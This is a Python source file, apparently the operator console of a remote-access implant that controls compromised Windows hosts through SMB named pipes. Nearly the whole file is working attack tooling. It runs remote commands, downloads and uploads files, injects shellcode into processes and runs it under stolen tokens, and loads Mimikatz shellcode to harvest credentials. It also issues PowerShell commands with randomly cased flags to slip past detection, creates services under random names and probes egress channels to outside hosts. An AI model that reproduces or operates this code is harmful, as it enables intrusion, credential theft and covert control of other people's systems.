# -*- coding: UTF-8 -*-

import base64
import logging
import os
import re
import struct
import traceback
import ntpath
from IPy import IP

from cmd import Cmd

import chardet

from framework import threads
from framework import utils
from framework.connector import init_smb_connection
from framework.connector import receive_data
from framework.connector import receive_status
from framework.connector import send_data
from framework.resources import ControlFlag
from framework.resources import ERROR_CODES
from framework import helpers


class Controller(Cmd):

    def __init__(self, opts, traffic, smb_conn):
        Cmd.__init__(self)
        self.opts = opts
        self.smb_conn = smb_conn
        self.traffic = traffic
        self.fid = None
        self.tid = None
        self.pipe_name = opts["pipe_name"]
        self.x64 = False
        self.sent_mimikatz_shellcode = False
        self.sent_powershell_shellcode = False

        self.old_completer = None
        self.pid = -1
        self.current_dir = ""
        self.username = ""
        self.history_file = os.path.join(opts["src"], ".history")

        self.service_helper = None

    def send_request(self, ctrl_flag, data=""):
        send_data(self.smb_conn, self.tid, self.fid, self.pipe_name, int(ctrl_flag), data, self.traffic)

    def receive_status(self):
        status, error_code = receive_status(self.smb_conn, self.tid, self.fid)
        if error_code in ERROR_CODES:
            error_str = "{0} {1}".format(ERROR_CODES[error_code], error_code)
        else:
            error_str = "UNKNOWN ERROR {0}".format(error_code)
        return status, error_code, error_str

    def send_mimikatz_shellcode(self):
        if self.x64:
            path = os.path.join(self.opts["data"], "mimikatz", "x64.bin")
        else:
            path = os.path.join(self.opts["data"], "mimikatz", "x86.bin")
        if not self.sent_mimikatz_shellcode:
            with open(path, "rb") as f:
                mimikatz_shellcode = f.read()
                send_data(self.smb_conn, self.tid, self.fid, self.pipe_name, 0, mimikatz_shellcode, self.traffic)
            self.sent_mimikatz_shellcode = True

    def send_powershell_shellcode(self):
        if self.x64:
            path = os.path.join(self.opts["data"], "powershell", "x64.bin")
        else:
            path = os.path.join(self.opts["data"], "powershell", "x86.bin")
        if not self.sent_powershell_shellcode:
            with open(path, "rb") as f:
                powershell_shellcode = f.read()
                send_data(self.smb_conn, self.tid, self.fid, self.pipe_name, 0, powershell_shellcode, self.traffic)
            self.sent_powershell_shellcode = True

    @staticmethod
    def get_paths_from_line(line):
        regex_str = r"((?P<single>\'[^\']+\')" \
                    r"|(?P<double>\"[^\"]+\")" \
                    r"|(?P<raw>[^ ^\"^\'][^ ^\"^\']+[^ ^\"^\']))"
        paths = []
        matches = []
        for m in re.finditer(regex_str, line):
            matches.append(m.group())
            if m.group("raw") is not None:
                paths.append(m.group())
            else:
                paths.append(m.group()[1:-1])
        return paths, matches

    def set_current_dir(self, current_dir):
        self.current_dir = current_dir
        self.prompt = u"({1}) {0}> ".format(self.current_dir, self.username)

    def get_save_name(self, save_name):
        download_dir = os.path.join(self.opts["download"], self.opts["ip"])
        if not os.path.exists(download_dir):
            os.makedirs(download_dir)

        save_name = os.path.basename(save_name)
        name, ext = os.path.splitext(save_name)
        postfix = ""
        i = 0
        while True:
            save_name = name + postfix + ext
            save_path = os.path.join(download_dir, save_name)
            if not os.path.exists(save_path):
                break
            i += 1
            postfix = "_{}".format(i)
        return save_name

    def ctrl_exit(self):
        try:
            self.send_request(ControlFlag.EXIT)
            _, error_code, error_str = self.receive_status()
            if error_code != 0:
                logging.error(error_str)
        except Exception:
            logging.debug(traceback.format_exc())

    def ctrl_kill_thread(self, arg):
        try:
            tid = int(arg)
        except Exception as e:
            logging.error(e)
            return
        data = struct.pack("<L", tid)
        self.send_request(ControlFlag.KILL_THREAD, data)
        tid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Killed thread {} successfully".format(tid))
        else:
            logging.error(error_str)

    def ctrl_kill_process(self, arg):
        try:
            pid = int(arg)
        except Exception as e:
            logging.error(e)
            return
        data = struct.pack("<L", pid)
        self.send_request(ControlFlag.KILL_PROCESS, data)
        pid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Killed process {} successfully".format(pid))
        else:
            logging.error(error_str)

    def ctrl_execute_command(self, command):
        if len(command) == 0:
            return
        data = u'/c {}\0'.format(command)
        data = data.encode("utf_16_le")
        self.send_request(ControlFlag.EXECUTE_COMMAND, data)

        pid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Execute command in subprocess: {}".format(pid))
            threads.receive_output(self.opts, self.traffic, "cmdline")
        else:
            logging.error(error_str)

    def ctrl_putty(self):
        self.send_request(ControlFlag.PUTTY)

        pid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Opened command prompt in subprocess: {}".format(pid))
            threads.open_putty(self.opts, self.traffic)
        else:
            logging.error(error_str)

    def ctrl_list_files(self):
        self.send_request(ControlFlag.LIST_FILES)

        pid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Executing task in thread: {}".format(pid))
            threads.receive_output(self.opts, self.traffic, "cmdline", "utf_16_le")
        else:
            logging.error(error_str)

    def ctrl_download_file(self, line):
        paths, _ = self.get_paths_from_line(line)
        if len(paths) == 0 or len(paths) > 2:
            return
        if len(paths) == 1:
            file_name = paths[0]
            save_name = paths[0]
        else:
            file_name, save_name = paths
        save_name = self.get_save_name(save_name)
        logging.info("File to download: {}".format(file_name))
        logging.info("Save as filename: {}".format(save_name))

        file_name = file_name + "\0"
        data = file_name.encode("utf_16_le")
        self.send_request(ControlFlag.DOWNLOAD_FILE, data)

        pid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Executing task in thread: {}".format(pid))
            threads.download_file(self.opts, self.traffic, file_name, save_name)
        else:
            logging.error(error_str)

    def ctrl_upload_file(self, line):
        paths, _ = self.get_paths_from_line(line)
        if len(paths) == 1:
            local_file = paths[0]
            file_name = os.path.basename(local_file)
        elif len(paths) == 2:
            local_file, file_name = paths
        else:
            return

        if not os.path.isfile(local_file):
            logging.info("{} not found".format(local_file))
            return
        if ntpath.isdir(file_name):
            file_name = ntpath.join(file_name, os.path.basename(local_file))

        file_name = file_name + "\0"
        data = file_name.encode("utf_16_le")
        self.send_request(ControlFlag.UPLOAD_FILE, data)

        pid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Executing task in thread: {}".format(pid))
            threads.upload_file(self.opts, self.traffic, file_name, local_file)
        else:
            logging.error(error_str)

    def ctl_get_current_dir(self):
        self.send_request(ControlFlag.GET_CURRENT_DIR)
        _, data = receive_data(self.smb_conn, self.tid, self.fid, self.pipe_name, self.traffic)
        current_dir = data.decode("utf_16_le")

        pid, error_code, error_str = self.receive_status()
        if error_code != 0:
            logging.error(error_str)
        else:
            logging.info(u"Current working directory: {}".format(current_dir))
            self.set_current_dir(current_dir)

    def ctl_set_current_dir(self, line):
        if line[-1] != "\\":
            line += "\\"
        line += "\0"
        data = line.encode("utf_16_le", "strict")
        self.send_request(ControlFlag.SET_CURRENT_DIR, data)

        _, data = receive_data(self.smb_conn, self.tid, self.fid, self.pipe_name, self.traffic)
        current_dir = data.decode("utf_16_le")

        pid, error_code, error_str = self.receive_status()
        if error_code != 0:
            logging.error(error_str)
        else:
            logging.info(u"Current working directory: {}".format(current_dir))
            self.set_current_dir(current_dir)

    def ctrl_list_processes(self):
        self.send_request(ControlFlag.LIST_PROCESSES)

        pid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Executing task in thread: {}".format(pid))
            threads.receive_output(self.opts, self.traffic, "cmdline", "utf_16_le")
        else:
            logging.error(error_str)

    def ctrl_execute_quick_command(self, command):
        data = u'/c {}\0'.format(command)
        data = data.encode("utf_16_le")
        self.send_request(ControlFlag.EXECUTE_QUICK_COMMAND, data)

        _, data = receive_data(self.smb_conn, self.tid, self.fid, self.pipe_name, self.traffic)
        try:
            data = data.decode(self.opts["encoding"])
        except:
            pass

        output_size, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Execute command successfully")
            if output_size != 0:
                data = u"Output size: {0} B\n\n{1}".format(output_size, data)
                logging.info(data)
        else:
            logging.error(error_str)

    def ctrl_shellcode(self, line, x64=False):
        path, _ = self.get_paths_from_line(line)
        if len(path) != 1:
            return
        path = path[0]
        if not os.path.isfile(path):
            logging.info("{} not found".format(path))
            return

        with open(path, 'rb') as f:
            content = f.read()
        data = struct.pack("<L", 0)  # get_output = FALSE
        data = data + struct.pack("<L", len(content))
        data = data + struct.pack("<L", 0)
        data = data + struct.pack("<L", 0)
        data = data + content
        if x64:
            self.send_request(ControlFlag.SHELLCODE64, data)
        else:
            self.send_request(ControlFlag.SHELLCODE, data)

        pid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Shellcode run in subprocess: {}".format(pid))
        else:
            logging.error(error_str)

    def ctrl_shellcode_token(self, line, x64=False):
        pid, path = line.split(" ", 1)
        try:
            pid = int(pid)
        except:
            return

        path, _ = self.get_paths_from_line(path)
        if len(path) != 1:
            return
        path = path[0]
        if not os.path.isfile(path):
            logging.info("{} not found".format(path))
            return

        with open(path, 'rb') as f:
            content = f.read()
        data = struct.pack("<L", pid)
        data = data + content
        if x64:
            self.send_request(ControlFlag.SHELLCODE_TOKEN64, data)
        else:
            self.send_request(ControlFlag.SHELLCODE_TOKEN, data)

        new_pid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Shellcode run in subprocess: {}".format(new_pid))
        else:
            logging.error(error_str)

    def ctrl_shellcode_inject(self, line, x64=False):
        pid, path = line.split(" ", 1)
        try:
            pid = int(pid)
        except:
            return

        path, _ = self.get_paths_from_line(path)
        if len(path) != 1:
            return
        path = path[0]
        if not os.path.isfile(path):
            logging.info("{} not found".format(path))
            return

        with open(path, 'rb') as f:
            content = f.read()
        data = struct.pack("<L", pid)
        data = data + content
        if x64:
            self.send_request(ControlFlag.SHELLCODE_INJECT64, data)
        else:
            self.send_request(ControlFlag.SHELLCODE_INJECT, data)

        tid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Shellcode run in thread {0} (process {1})".format(tid, pid))
        else:
            logging.error(error_str)
        pass

    def ctrl_shellcode_local(self, line, x64=False):
        path, _ = self.get_paths_from_line(line)
        if len(path) != 1:
            return
        path = path[0]
        if not os.path.isfile(path):
            logging.info("{} not found".format(path))
            return

        with open(path, 'rb') as f:
            data = f.read()
        if x64:
            self.send_request(ControlFlag.SHELLCODE_LOCAL64, data)
        else:
            self.send_request(ControlFlag.SHELLCODE_LOCAL, data)

        pid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Shellcode run in subprocess: {}".format(pid))
        else:
            logging.error(error_str)

    def ctrl_mimikatz(self, command, get_output):
        if not get_output:
            log_file = "{}.txt".format(utils.get_random_name())
            logging.info("Using '{}' for logfile".format(log_file))
            command = '"log {}" '.format(log_file) + command
        data = command + "\0"
        data = base64.b64encode(data.encode("utf_16_le", "strict")) + "\0"
        if get_output:
            self.send_request(ControlFlag.MIMIKATZ, data)
        else:
            self.send_request(ControlFlag.LOCAL_MIMIKATZ, data)
        self.send_mimikatz_shellcode()

        pid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("Mimikatz run in subprocess: {}".format(pid))
            if get_output:
                threads.receive_output(self.opts, self.traffic, "mimikatz", "utf8")
        else:
            logging.error(error_str)

    def ctrl_powershell(self, command, encode, get_output):
        if encode:
            data = utils.random_case("-enc ") + command + "\0"
        else:
            data = utils.random_case("-comma ") + command + "\0"
        data = data.encode("ascii", "strict")
        if get_output:
            self.send_request(ControlFlag.POWERSHELL, data)
        else:
            self.send_request(ControlFlag.LOCAL_POWERSHELL, data)
        self.send_powershell_shellcode()

        pid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("PowerShell run in subprocess: {}".format(pid))
            if get_output:
                threads.receive_output(self.opts, self.traffic, "powershell")
        else:
            logging.error(error_str)

    def ctrl_powershell_file(self, line, get_output):
        path, match = self.get_paths_from_line(line)
        if len(path) == 0:
            return
        path = path[0]
        match = match[0]
        if not os.path.exists(path):
            logging.info("{} not found".format(path))
            return

        with open(path, 'rb') as f:
            content = f.read()
            encoding = chardet.detect(content)['encoding']
            content = content.decode(encoding)

        args = line.replace(match, "", 1).strip()
        if args != "":
            content = content + "\r\n" + args

        content = content + "\r\n"
        content = content.encode("cp437", "strict")

        cmdline_path = os.path.join(self.opts["misc"], "module_powershell.txt")
        with open(cmdline_path, "rb") as f:
            cmdline = f.read()
        cmdline = cmdline + "\0"
        cmdline = cmdline.encode("cp437", "strict")

        data = struct.pack("<L", len(content))
        data = data + struct.pack("<L", len(cmdline))
        data = data + content
        data = data + cmdline

        if get_output:
            self.send_request(ControlFlag.POWERSHELL_FILE, data)
        else:
            self.send_request(ControlFlag.LOCAL_POWERSHELL_FILE, data)
        self.send_powershell_shellcode()

        pid, error_code, error_str = self.receive_status()
        if error_code == 0:
            logging.info("PowerShell run in subprocess: {}".format(pid))
            if get_output:
                threads.receive_output(self.opts, self.traffic, "powershell")
        else:
            logging.error(error_str)

    def create_service(self, line):
        if self.service_helper is False:
            logging.error("Cannot create service!")
            return
        if self.service_helper is None:
            try:
                smb_conn = init_smb_connection(self.opts, False)
                self.service_helper = helpers.ServiceHelper(self.opts, smb_conn)
                self.service_helper.init()
            except:
                self.service_helper = False
                return

        try:
            name = utils.get_random_name()
            logging.info("Creating service with path: {1}".format(name, line))
            self.service_helper.create_service(name, line)
        except Exception as e:
            logging.error(e)

    def delete_service(self, line):
        if self.service_helper is False:
            logging.error("Cannot create service!")
            return
        if self.service_helper is None:
            try:
                smb_conn = init_smb_connection(self.opts, False)
                self.service_helper = helpers.ServiceHelper(self.opts, smb_conn)
                self.service_helper.init()
            except:
                self.service_helper = False
                return

        try:
            self.service_helper.delete_service_with_name(line)
        except Exception as e:
            logging.error(e)

    def ctl_send_http(self, line):
        if line == "":
            line = "yahoo.com"
        try:
            data = (line + "\0").encode("ascii", "strict")
            self.send_request(ControlFlag.CHECK_HTTP, data)
        except Exception as e:
            logging.info(e)
            return

        is_success, error_code, error_str = self.receive_status()
        if is_success == 1:
            logging.info(u"Sent HTTP GET successfully: {}".format(line))
        else:
            logging.info(u"Failed to send HTTP GET: {}".format(line))

    def ctl_send_dns(self, line):
        if line != "":
            try:
                IP(line)
                data = (line + "\0").encode("ascii", "strict")
                self.send_request(ControlFlag.CHECK_DNS, data)
            except Exception as e:
                logging.info(e)
                return
        else:
            line = "(default)"
            self.send_request(ControlFlag.CHECK_DNS_LOCAL, "")

        is_success, error_code, error_str = self.receive_status()
        if is_success == 1:
            logging.info(u"Sent DNS (UDP 53) successfully: {}".format(line))
        else:
            logging.info(u"Failed to send DNS (UDP 53): {}".format(line))

    def ctl_send_icmp(self, line):
        if line == "":
            line = "8.8.8.8"
        try:
            IP(line)
            data = (line + "\0").encode("ascii", "strict")
            self.send_request(ControlFlag.CHECK_ICMP, data)
        except Exception as e:
            logging.info(e)
            return

        is_success, error_code, error_str = self.receive_status()
        if is_success == 1:
            logging.info(u"Sent ICMP successfully: {}".format(line))
        else:
            logging.info(u"Failed to send ICMP: {}".format(line))

    def ctl_send_tcp(self, line):
        if line == "":
            ip = "90.130.70.73"
            port = 21
        else:
            ip, port = line.split(" ")
        try:
            port = int(port)
            IP(ip)
            data = struct.pack("<L", port) + (ip + "\0").encode("ascii", "strict")
            self.send_request(ControlFlag.CHECK_TCP, data)
        except Exception as e:
            logging.info(e)
            return

        is_success, error_code, error_str = self.receive_status()
        if is_success == 1:
            logging.info(u"Sent TCP successfully: {}".format(ip))
        else:
            logging.info(u"Failed to send TCP: {}".format(ip))
